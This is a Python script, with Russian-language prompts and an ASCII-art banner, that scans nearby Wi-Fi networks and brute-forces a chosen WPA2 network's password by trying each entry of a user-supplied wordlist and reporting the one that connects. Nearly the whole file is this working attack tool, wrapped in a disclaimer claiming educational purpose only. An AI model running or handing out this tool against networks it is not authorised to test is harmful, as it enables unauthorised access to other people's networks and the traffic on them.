import pywifi
from pywifi import const
import time
import colorama
from colorama import Fore, Style
import os

colorama.init()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
__________s§§§§ss.__.ss§§§§§§§§§ss.
____________?§§§§§§§§§§§§§§§§§§§§§§s.
_____________§§§§§§§§§§§§§§§§§§§§§§§?
_____________§§§§§§§§§§§§§§§§§§O§§§§§s
____________s§§§§§§§§§§§§§§§§§§§§§s§§§§§§s
___________s§§§§§§§§§§§§§§§§§§?§§§§§?????'
__________s§§§§§§§§§§§§§§???'
__________§§§§§§§§§§§§??'
_________s§§§§§§§§§??'
________s§§§§§§§§?
________§§§§§§?'
________§§§§§'
________§§§§'
________§§§'
________§§§
________§§§§ssss
______s§§§§§§§§§§§s,
_____s§§§§§§§???'
____§§§§???
  
 Автор не несёт ответственности за действия других пользователей, проект создан только в образовательных целях, и не призывает пользователей к нелегальным действиям!
    """ + Style.RESET_ALL)

def scan_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    print(Fore.YELLOW + "[*] Сканирование Wi-Fi сетей..." + Style.RESET_ALL)
    time.sleep(3)
    results = iface.scan_results()
    
    seen = set()
    networks = []
    for net in results:
        if net.ssid not in seen and net.ssid != "":
            seen.add(net.ssid)
            networks.append(net)
    return networks

def show_networks(networks):
    print(Fore.GREEN + "\n[+] Доступные сети:\n" + Style.RESET_ALL)
    for i, net in enumerate(networks):
        print(f"  [{i}] {net.ssid} - {Fore.MAGENTA}{net.bssid}{Style.RESET_ALL} - Сигнал: {net.signal} dBm")

def try_connect(ssid, password, iface):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.key = password
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(4)

    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        time.sleep(1)
        return True
    return False

def brute_force(network, wordlist_path):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    ssid = network.ssid

    print(Fore.CYAN + f"\n[*] Атака на: {ssid}\n" + Style.RESET_ALL)
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.strip()
            print(f"[?] Пробуем пароль: {Fore.YELLOW}{password}{Style.RESET_ALL}")
            if try_connect(ssid, password, iface):
                print(Fore.GREEN + f"\n[+] УСПЕХ! Пароль найден: {password}" + Style.RESET_ALL)
                return password
    print(Fore.RED + "\n[-] Не удалось подобрать пароль." + Style.RESET_ALL)
    return None

def main():
    clear()
    banner()
    networks = scan_networks()
    show_networks(networks)

    try:
        choice = int(input("\nВыберите сеть по номеру: "))
        network = networks[choice]
    except:
        print(Fore.RED + "Неверный выбор." + Style.RESET_ALL)
        return

    wordlist_path = input("\nУкажите путь к словарю: ").strip()
    if not os.path.exists(wordlist_path):
        print(Fore.RED + "Словарь не найден!" + Style.RESET_ALL)
        return

    brute_force(network, wordlist_path)

if __name__ == "__main__":
    main()


#Автор не несёт ответственности за действия других пользователей, проект создан только в образовательных целях, и не призывает пользователей к нелегальным действиям!